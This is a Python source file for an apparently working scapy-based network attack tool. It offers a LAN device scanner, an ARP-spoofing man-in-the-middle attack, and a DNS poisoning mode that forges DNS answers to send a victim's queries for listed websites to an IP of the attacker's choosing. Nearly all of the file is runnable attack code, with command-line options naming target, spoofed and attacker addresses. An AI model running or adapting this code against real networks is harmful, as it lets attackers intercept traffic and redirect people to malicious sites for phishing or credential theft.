import argparse, re, subprocess, time, threading
import scapy.all as scapy
from sys import exit

#global var
NULL_MAC_ADDRESS = "ff:ff:ff:ff:ff:ff"
stop_flag_sniffing = threading.Event() #flags mainly used for packet injection
stop_flag_mitm = threading.Event()
with open("websites_list_without_domains.txt", "r") as f:
    # load, strip and ignore empty lines; normalize to lowercase for stable comparisons
    WEBSITES_LIST = [line.strip().lower() for line in f if line.strip()]

#this constant changes based on the device's language settings
NSLOOKUP_OUTPUT_NAME_LABEL = "nome"

def validate_ip(ip: list[str]) -> bool: 
    ipv4_regex = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    for element in ip:
        if not re.search(ipv4_regex, element): 
            print(f"Invalid IP address: {element}")
            return False
    return True

def validate_mac(mac: str) -> bool:
    mac_regex = r"([0-9a-fA-F]:?){12}"
    if not re.search(mac_regex, mac):
        print(f"Invalid MAC address: {mac}")
        return False
    return True

def scan(network_ip: str, verbose: bool, wait: int, subnet_mask: int) -> None:
    #checking if the network's ip address is valid
    if not validate_ip([network_ip]): exit(1)

    #scanning the network
    subnet = f"{network_ip}/{subnet_mask}"
    broadcast_request = scapy.Ether(dst=NULL_MAC_ADDRESS) / scapy.ARP(pdst=subnet)
    devices = scapy.srp(broadcast_request, timeout = wait, verbose = False)[0] #ignoring unanswered requests

    #printing out the results
    print(f"Found devices: {len(devices)}")
    if not verbose: print(f"IP\t\t\t\tMAC\t\t\t\t\tDEVICE'S NAME\n" + "-"*100)
    for device in devices: 
        device_ip = device[1].psrc
        device_mac = device[1].hwsrc
        result = subprocess.run(["nslookup", device_ip], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True).stdout
        try:
            name = "Unknown" if "timeout" in result else {k.strip().lower(): v.strip() for line in result.split("\n") if ":" in line for k, v in [line.split(":")]}[NSLOOKUP_OUTPUT_NAME_LABEL]
        except IndexError:
            name = "Failed to format ouput" 
        if verbose: print(f"\n{device}\nName:{name}")
        else: print(f"{device_ip}\t\t\t{device_mac}\t\t\t{name}")


def mitm_attack(target_ip: str, spoof_ip: str, attacker_ip: str, target_mac: str, spoof_mac: str, attacker_mac: str, mac_timeout: int, packet_timeout: float, mode: int, fix_table: bool) -> None:
    #check if ip addresses are valid
    if not validate_ip([target_ip, spoof_ip, attacker_ip]): exit(1)
    
    #get the mac addresses if not already given
    ip_to_mac_addresses = {
        target_ip: target_mac,
        spoof_ip: spoof_mac,
        attacker_ip: attacker_mac
    }
    for ip_address in ip_to_mac_addresses.keys():
        mac_address = ip_to_mac_addresses[ip_address]
        if mac_address == NULL_MAC_ADDRESS: ip_to_mac_addresses[ip_address] = get_mac(ip_address, mac_timeout)
        else: 
            #mac addresses validation
            if not validate_mac(mac_address): exit(1)
            
    # start the attack
    sent_packets = 0
    if mode == 1:
        print("The MITM attack (one-way) is starting ...")
        while not stop_flag_mitm.is_set():
            spoof(spoof_ip, target_ip, ip_to_mac_addresses[spoof_ip], ip_to_mac_addresses[attacker_ip], packet_timeout) 
            sent_packets+=1
            print(f"\rARP packets sent: {sent_packets}", end="")
    elif mode == 2:
        print("The MITM attack (both-ways) is starting ...")
        while not stop_flag_mitm.is_set():
            spoof(spoof_ip, target_ip, ip_to_mac_addresses[spoof_ip], ip_to_mac_addresses[attacker_ip], packet_timeout) 
            spoof(target_ip, spoof_ip, ip_to_mac_addresses[target_ip], ip_to_mac_addresses[attacker_ip], packet_timeout)
            sent_packets+=2
            print(f"\rARP packets sent: {sent_packets}", end="")
    if fix_table:
        print("\nAttack ended. Wait 60 seconds to fix the devices' ARP tables...")
        time.sleep(60) # avoid duplicate using of ip address
        for _ in range(5):
            spoof(spoof_ip, target_ip, ip_to_mac_addresses[spoof_ip], ip_to_mac_addresses[spoof_ip], 0)
            spoof(target_ip, spoof_ip, ip_to_mac_addresses[target_ip], ip_to_mac_addresses[target_ip], 0)

def spoof(spoof_ip: str, target_ip: str, spoof_mac: str, attacker_mac: str, wait: float) -> None:
    packet = scapy.Ether(dst=spoof_mac, type=0x0806) / scapy.ARP(op=2, pdst=spoof_ip, psrc=target_ip, hwsrc=attacker_mac)
    scapy.sendp(packet, verbose=False, inter=wait)

def get_mac(ip_address: str, wait: int) -> str:
    mac_address = None
    attempts = 1
    while not mac_address or mac_address == NULL_MAC_ADDRESS:
        print(f"\rAttemp to retrieve MAC address from {ip_address} no. {attempts}", end="")

        arp_broadcast_packet = scapy.Ether(dst=NULL_MAC_ADDRESS) / scapy.ARP(op=1, pdst=ip_address)
        try: mac_address = scapy.srp(arp_broadcast_packet, timeout=wait, verbose=False)[0][0][1].hwsrc
        except IndexError: continue # no received packet 

        print(f"\rAttemp to retrieve MAC address from {ip_address} no. {attempts}\t-->  Failed", end="")
        attempts+=1
    
    print(f"\rAttemp to retrieve MAC address from {ip_address} no. {attempts}\t-->  Success: {mac_address}")
    return mac_address


def sniff_traffic(spoof_ip: str, ttl: int, redirect_to: str):
    #check if ip address is valid
    if not validate_ip([spoof_ip]): exit(1)

    print("Starting to sniff traffic on the network...")
    while not stop_flag_sniffing.is_set():
        scapy.sniff(promisc=True, prn = lambda packet: checkpacket(packet, spoof_ip, ttl, redirect_to), filter=f"(src host {spoof_ip} or dst host {spoof_ip}) and port 53", count=1, timeout=2, store=False)
        
def check_website(queried_website: str) -> bool:
    q = queried_website.rstrip('.').lower()
    for website in WEBSITES_LIST:
        if website in q:
            return True
    return False

def checkpacket(packet, spoof_ip: str, time_to_live: int, redirect_to_ip: str):
    if packet.haslayer(scapy.DNS) and packet.haslayer(scapy.IP) and packet[scapy.IP].src == spoof_ip and check_website(packet[scapy.DNSQR].qname.decode()):
        ether_layer = scapy.Ether(
            src=packet[scapy.Ether].dst,
            dst=packet[scapy.Ether].src
        )
        ip_layer = scapy.IP(
            src = packet[scapy.IP].dst, 
            dst = packet[scapy.IP].src
        )
        dns_layer = scapy.DNS(
            id = packet[scapy.DNS].id,
            qd = packet[scapy.DNS].qd,
            aa = 1,
            rd = 0,
            qr = 1,
            qdcount = 1,
            ancount = 1,
            nscount = 0,
            arcount = 0,
            an=scapy.DNSRR(
                rrname = packet[scapy.DNS].qd.qname,
                type="A",
                ttl=time_to_live, 
                rdata = redirect_to_ip
            )
        )
        if packet.haslayer(scapy.TCP):
            tcp_layer = scapy.TCP(
                sport=53, 
                dport = packet[scapy.TCP].sport, 
                flags="PA", 
                seq=packet[scapy.TCP].ack, 
                ack=packet[scapy.TCP].seq + len(packet[scapy.TCP].payload)
            )
            answer_packet = ether_layer / ip_layer / tcp_layer / dns_layer
        else:
            udp_layer = scapy.UDP(
                dport = packet[scapy.UDP].sport,
                sport = packet[scapy.UDP].dport
            )
            answer_packet = ether_layer / ip_layer / udp_layer / dns_layer

        scapy.sendp(answer_packet, verbose=False)

# CLI configuration
parser = argparse.ArgumentParser()
comand_parser = parser.add_subparsers(dest='comand', required=True, help="Choose the command to run")

nds_comandparser = comand_parser.add_parser("nds", help="Scan the network for its connected device")
nds_comandparser.add_argument("-g" ,"--gatewayip", required=True, help="Specify the network's IP address", type = str)
nds_comandparser.add_argument("-v", "--verbose", action="store_true", required=False, help="Shows more info on the found connected devices")
nds_comandparser.add_argument("-t", "--timeout", required=False, type=int, default=10, help="Specify how long to wait before declaring a request unanswered. A longer time may provide better results. Defualt time is 10 seconds")
nds_comandparser.add_argument("-sm", "--subnetmask", required=False, type=int, default=24, help="Specify the subnet mask (CIDR notation). Default is 24, which means packets will be sent to all 255 possible hosts in the subnet.")

mitma_comandparser = comand_parser.add_parser("mitma", help="Run a Man In The Middle attack")
mitma_comandparser.add_argument("-ti", "--targetip", required=True, type=str, help="Target's IP")
mitma_comandparser.add_argument("-si", "--spoofip", required=True, type=str, help="IP address to spoof")
mitma_comandparser.add_argument("-ai", "--attackerip", required=True, type=str, help="Attacker's IP. Usually it is the IP of the device that is running the attack")
mitma_comandparser.add_argument("-tm", "--targetmac", required=False, default=NULL_MAC_ADDRESS, type=str, help="Target's MAC address. It can be found by using the target's IP address")
mitma_comandparser.add_argument("-sm", "--spoofmac", required=False, default=NULL_MAC_ADDRESS, type=str, help="MAC address to spoof. It can be found by using the spoofed device's IP address")
mitma_comandparser.add_argument("-am", "--attackermac", required=False, default=NULL_MAC_ADDRESS, type=str, help="Attacker's MAC address. It can be found by using the attacker's IP address")
mitma_comandparser.add_argument("-mt", "--mactimeout", required=False, default=10, type=int, help="Set the time (in seconds) to wait to find the MAC addresses (if not already given). Keep in mind the attack can't start without the MAC addresses. By default the time to wait is 10 seconds")
mitma_comandparser.add_argument("-pt", "--packettimeout", required=False, default=0, type=float, help="Set the time (in seconds) to wait to send another ARP packet. By default the time to wait is 0 seconds")
mitma_comandparser.add_argument("-m", "--mode", required=False, default=2, type=int, help="Set the mode of the attack. The attack can be set in one-way mode (1) or both-ways mode (2). By default the attack runs in both-ways mode (2)")
fixtables_group = mitma_comandparser.add_mutually_exclusive_group()
fixtables_group.add_argument("--fixtables", dest="fixtables", action="store_true", help="Fix ARP tables. You will need to wait 60 seconds once the attack ended in order to fix the ARP tables. This is the default option")
fixtables_group.add_argument("--no-fixtables", dest="fixtables", action="store_false", help="Do not fix ARP tables")
mitma_comandparser.set_defaults(fixtables=True)

injection_comandparser = comand_parser.add_parser("dpa", help="Run a DNS poisoning attack (together with a MITM attack)")
injection_comandparser.add_argument("-ti", "--targetip", required=True, type=str, help="Target's IP")
injection_comandparser.add_argument("-si", "--spoofip", required=True, type=str, help="IP address to spoof")
injection_comandparser.add_argument("-ai", "--attackerip", required=True, type=str, help="Attacker's IP. Usually it is the IP of the device that is running the attack")
injection_comandparser.add_argument("-tm", "--targetmac", required=False, default=NULL_MAC_ADDRESS, type=str, help="Target's MAC address. It can be found by using the target's IP address")
injection_comandparser.add_argument("-sm", "--spoofmac", required=False, default=NULL_MAC_ADDRESS, type=str, help="MAC address to spoof. It can be found by using the spoofed device's IP address")
injection_comandparser.add_argument("-am", "--attackermac", required=False, default=NULL_MAC_ADDRESS, type=str, help="Attacker's MAC address. It can be found by using the attacker's IP address")
injection_comandparser.add_argument("-mt", "--mactimeout", required=False, default=10, type=int, help="Set the time (in seconds) to wait to find the MAC addresses (if not already given). Keep in mind the attack can't start without the MAC addresses. By default the time to wait is 10 seconds")
injection_comandparser.add_argument("-pt", "--packettimeout", required=False, default=0, type=float, help="Set the time (in seconds) to wait to send another ARP packet. By default the time to wait is 0 seconds")
injection_comandparser.add_argument("-m", "--mode", required=False, default=2, type=int, help="Set the mode of the attack. The attack can be set in one-way mode (1) or both-ways mode (2). By default the attack runs in both-ways mode (2)")
fixtables_group = injection_comandparser.add_mutually_exclusive_group()
fixtables_group.add_argument("--fixtables", dest="fixtables", action="store_true", help="Fix ARP tables. You will need to wait 60 seconds once the attack ended in order to fix the ARP tables. This is the default option")
fixtables_group.add_argument("--no-fixtables", dest="fixtables", action="store_false", help="Do not fix ARP tables")
injection_comandparser.set_defaults(fixtables=True)
injection_comandparser.add_argument("-ttl", "--timetolive", required=False, default=10, type=int, help="Set the time to live (TTL) of the fake DNS packets. By default it is set to 10 seconds as a shorter TTL makes the attacked device send DNS requests more often")
injection_comandparser.add_argument("-ri", "--redirectip", required=True, type=str, help="Specify the IP address of the website to redirect the attacked device to")

args = parser.parse_args()
parser = args.comand
if parser == "nds":
    try: scan(args.gatewayip, args.verbose, args.timeout, args.subnetmask)
    except KeyboardInterrupt: exit(2)
    except Exception as e: print(f"The following error was unhandled: {e}")
elif parser == "mitma":
    try: mitm_attack(args.targetip, args.spoofip, args.attackerip, args.targetmac, args.spoofmac, args.attackermac, args.mactimeout, args.packettimeout, args.mode, args.fixtables)
    except KeyboardInterrupt: exit(2)
    except Exception as e: print(f"The following error was unhandled: {e}")
elif parser == "dpa":
    try:
        sniff_thread = threading.Thread(target=sniff_traffic, args=(args.spoofip, args.timetolive, args.redirectip))
        mitm_thread = threading.Thread(target=mitm_attack, args=(args.targetip, args.spoofip, args.attackerip, args.targetmac, args.spoofmac, args.attackermac, args.mactimeout, args.packettimeout, args.mode, args.fixtables))
        sniff_thread.start()
        mitm_thread.start()

        while sniff_thread.is_alive() or mitm_thread.is_alive():
            try: time.sleep(0.2) #keep the main threat alive
            except KeyboardInterrupt: 
                print("Please wait a few seconds, the script is closing...")
                stop_flag_mitm.set()
                stop_flag_sniffing.set()
                sniff_thread.join()
                mitm_thread.join()
                exit(2)
    except Exception as e: print(f"The following error was unhandled: {e}")